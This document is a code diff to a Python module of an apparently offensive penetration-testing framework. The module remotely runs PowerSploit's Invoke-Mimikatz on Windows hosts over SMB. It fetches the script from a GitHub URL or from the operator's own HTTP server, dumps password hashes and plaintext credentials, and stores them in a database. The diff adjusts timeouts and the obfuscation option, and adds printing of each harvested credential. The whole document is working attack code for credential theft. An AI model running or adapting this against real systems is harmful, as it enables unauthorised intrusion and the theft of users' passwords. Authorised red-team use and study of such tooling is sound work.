@@ -6,7 +6,7 @@ from ar3.helpers.misc import validate_ntlm
 
 class InvokeMimikatz():
     def __init__(self):
-        self.name = 'invoke-mimikatz'
+        self.name = 'Mimikatz'
         self.description = 'Execute PowerSpoits Invoke-Mimikatz.ps1'
         self.author = ['@m8r0wn']
         self.args = {
@@ -26,17 +26,10 @@ class InvokeMimikatz():
             if args.fileless:
                 srv_addr = get_local_ip()
                 script_location = 'http://{}/Invoke-Mimikatz.ps1'.format(srv_addr)
-                loggers['console'].warning([smb_con.host, smb_con.ip, self.name.upper(),'Fileless execution may take up to 60 seconds for file transfer'])
-                setattr(args, 'timeout', timeout + 65)
-                '''
-                "setattr(args, 'timeout', timeout+#)" Modifies the default timeout to allow for more execution time 
-                on the system. This is required since the file transfer over HTTP can take up to 25 seconds, especially
-                when using the  "--fileless" option. All execution method classes perform a sleep(self.timeout) before
-                retrieving the cmd output, therefore this timeout modification will also delay the results in the terminal.
-                '''
+                setattr(args, 'timeout', timeout + 60)
             else:
                 script_location = 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1'
-                setattr(args, 'timeout', timeout + 12)
+                setattr(args, 'timeout', timeout + 25)
             logger.debug('Script source: {}'.format(script_location))
 
             # Setup PS1 Script
@@ -45,25 +38,36 @@ class InvokeMimikatz():
 
             try:
                 # Execute
-                cmd = powershell.create_ps_command(launcher, loggers['console'], force_ps32=args.force_ps32, obfs=args.obfs, server_os=smb_con.os)
-                x = code_execution(smb_con, args, target, loggers, config_obj, cmd=cmd, return_data=True)
+                cmd = powershell.create_ps_command(launcher, loggers['console'], force_ps32=args.force_ps32, no_obfs=args.no_obfs, server_os=smb_con.os)
+                results = code_execution(smb_con, args, target, loggers, config_obj, cmd, return_data=True)
+
                 # Display Output
-                for line in x.splitlines():
-                    loggers['console'].success([smb_con.host, smb_con.ip, self.name.upper(), line])
+                if not results:
+                    loggers['console'].fail([smb_con.host, smb_con.ip, self.name.upper(), 'No output returned'])
+                    return
+
+                if args.debug:
+                    for line in results.splitlines():
+                        loggers['console'].debug([smb_con.host, smb_con.ip, self.name.upper(), line])
 
                 # Parse results and send creds to db
                 db_updates = 0
-                for cred in self.parse_mimikatz(x):
+                for cred in self.parse_mimikatz(results):
                     if cred[0] == "hash":
                         smb_con.db.update_user(cred[2], '', cred[1], cred[3])
+                        loggers['console'].success([smb_con.host, smb_con.ip, self.name.upper(),"{}\\{}:{}".format(cred[1],cred[2],cred[3])])
                         db_updates += 1
 
                     elif cred[0] == "plaintext":
                         smb_con.db.update_user(cred[2], cred[3], cred[1], '')
+                        loggers['console'].success([smb_con.host, smb_con.ip, self.name.upper(),"{}\\{}:{}".format(cred[1], cred[2], cred[3])])
                         db_updates += 1
-                loggers['console'].success([smb_con.host, smb_con.ip, self.name.upper(), "{} credentials updated in database".format(db_updates)])
+                loggers['console'].info([smb_con.host, smb_con.ip, self.name.upper(), "{} credentials updated in database".format(db_updates)])
             except Exception as e:
-                loggers['console'].debug([smb_con.host, smb_con.ip, self.name.upper(), str(e)])
+                if str(e) == "list index out of range":
+                    loggers['console'].fail([smb_con.host, smb_con.ip, self.name.upper(), "{} failed".format(self.name)])
+                else:
+                    loggers['console'].fail([smb_con.host, smb_con.ip, self.name.upper(), str(e)])
 
         except Exception as e:
             logger.debug("{} Error: {}".format(self.name, str(e)))
